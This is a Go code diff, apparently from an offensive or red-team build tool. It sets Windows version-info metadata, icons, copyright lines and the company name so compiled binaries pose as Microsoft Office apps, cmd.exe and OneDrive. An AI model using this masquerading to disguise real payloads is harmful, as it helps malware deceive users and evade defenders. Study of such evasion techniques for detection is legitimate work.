@@ -337,8 +337,10 @@ func FileProperties(name string, configFile string) string {
 			vi.StringFileInfo.InternalName = "tcpmon.dll.mui"
 		}
 		if name == "OneNote" {
+			vi.IconPath = "onenote.ico"
 			vi.StringFileInfo.InternalName = "OneNote"
 			vi.StringFileInfo.FileDescription = "Microsoft OneNote"
+			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
 			vi.StringFileInfo.FileVersion = "16.0.14326.20404"
 			vi.StringFileInfo.OriginalFilename = "OneNote.exe"
 			vi.StringFileInfo.ProductName = "Microsoft OneNote"
@@ -349,23 +351,11 @@ func FileProperties(name string, configFile string) string {
 			vi.FixedFileInfo.FileVersion.Build = 20404
 			vi.StringFileInfo.InternalName = "OneNote"
 		}
-		if name == "Notepad" {
-			vi.StringFileInfo.InternalName = "Notepad"
-			vi.StringFileInfo.FileDescription = "Microsoft OneNote"
-			vi.StringFileInfo.FileVersion = "10.0.19041.1"
-			vi.StringFileInfo.OriginalFilename = "Notepad.exe"
-			vi.StringFileInfo.ProductName = "Microsoft Notepad"
-			vi.StringFileInfo.ProductVersion = "10.0.19041.1"
-			vi.FixedFileInfo.FileVersion.Major = 10
-			vi.FixedFileInfo.FileVersion.Minor = 0
-			vi.FixedFileInfo.FileVersion.Patch = 19041
-			vi.FixedFileInfo.FileVersion.Build = 1080
-			vi.StringFileInfo.InternalName = "Notepad"
-		}
-
 		if name == "Excel" {
+			vi.IconPath = "excel.ico"
 			vi.StringFileInfo.InternalName = "Excel"
 			vi.StringFileInfo.FileDescription = "Microsoft Excel"
+			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
 			vi.StringFileInfo.FileVersion = "16.0.14326.20404"
 			vi.StringFileInfo.OriginalFilename = "Excel.exe"
 			vi.StringFileInfo.ProductName = "Microsoft Office"
@@ -377,7 +367,9 @@ func FileProperties(name string, configFile string) string {
 			vi.StringFileInfo.InternalName = "Excel"
 		}
 		if name == "Word" {
+			vi.IconPath = "word.ico"
 			vi.StringFileInfo.InternalName = "Word"
+			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
 			vi.StringFileInfo.FileVersion = "16.0.14326.20404"
 			vi.StringFileInfo.OriginalFilename = "Word.exe"
 			vi.StringFileInfo.ProductName = "Microsoft Office"
@@ -389,8 +381,9 @@ func FileProperties(name string, configFile string) string {
 			vi.StringFileInfo.InternalName = "Word"
 		}
 		if name == "Powerpnt" {
-			vi.StringFileInfo.InternalName = "Powerpnt"
+			vi.IconPath = "powerpoint.ico"
 			vi.StringFileInfo.FileDescription = "Microsoft PowerPoint"
+			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
 			vi.StringFileInfo.FileVersion = "16.0.14326.20404"
 			vi.StringFileInfo.OriginalFilename = "Powerpnt.exe"
 			vi.StringFileInfo.ProductName = "Microsoft Office"
@@ -402,8 +395,10 @@ func FileProperties(name string, configFile string) string {
 			vi.StringFileInfo.InternalName = "Powerpnt"
 		}
 		if name == "Outlook" {
+			vi.IconPath = "outlook.ico"
 			vi.StringFileInfo.InternalName = "Outlook"
 			vi.StringFileInfo.FileDescription = "Microsoft Outlook"
+			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
 			vi.StringFileInfo.FileVersion = "16.0.14326.20404"
 			vi.StringFileInfo.OriginalFilename = "Outlook.exe"
 			vi.StringFileInfo.ProductName = "Microsoft Office"
@@ -415,8 +410,10 @@ func FileProperties(name string, configFile string) string {
 			vi.StringFileInfo.InternalName = "Outlook"
 		}
 		if name == "lync" {
+			vi.IconPath = "lync.ico"
 			vi.StringFileInfo.InternalName = "Lync"
 			vi.StringFileInfo.FileDescription = "Skype for Business"
+			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
 			vi.StringFileInfo.FileVersion = "16.0.14326.20404"
 			vi.StringFileInfo.OriginalFilename = "Lync.exe"
 			vi.StringFileInfo.ProductName = "Microsoft Office"
@@ -428,8 +425,10 @@ func FileProperties(name string, configFile string) string {
 			vi.StringFileInfo.InternalName = "Lync"
 		}
 		if name == "cmd" {
+			vi.IconPath = "cmd.ico"
 			vi.StringFileInfo.InternalName = "Cmd.exe"
 			vi.StringFileInfo.FileDescription = "Windows Command Processor"
+			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
 			vi.StringFileInfo.FileVersion = "10.0.19041.1 (WinBuild.160101.0800)"
 			vi.StringFileInfo.OriginalFilename = "Cmd.exe"
 			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
@@ -441,8 +440,10 @@ func FileProperties(name string, configFile string) string {
 			vi.StringFileInfo.InternalName = "Cmd.exe"
 		}
 		if name == "OneDrive" {
+			vi.IconPath = "onedrive.ico"
 			vi.StringFileInfo.InternalName = "OneDrive.exe"
 			vi.StringFileInfo.FileDescription = "Microsoft OneDrive"
+			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
 			vi.StringFileInfo.FileVersion = "21.170.0822.0002"
 			vi.StringFileInfo.OriginalFilename = "OneDrive.exe"
 			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
@@ -1161,8 +1162,8 @@ func FileProperties(name string, configFile string) string {
 			vi.StringFileInfo.InternalName = "Appwiz.xll"
 		}
 	}
-	vi.VarFileInfo.Translation.LangID = goversioninfo.LangID(1033)
-	vi.VarFileInfo.Translation.CharsetID = goversioninfo.CharsetID(1200)
+
+	vi.StringFileInfo.CompanyName = "Microsoft Corporation"
 
 	vi.Build()
 	vi.Walk()
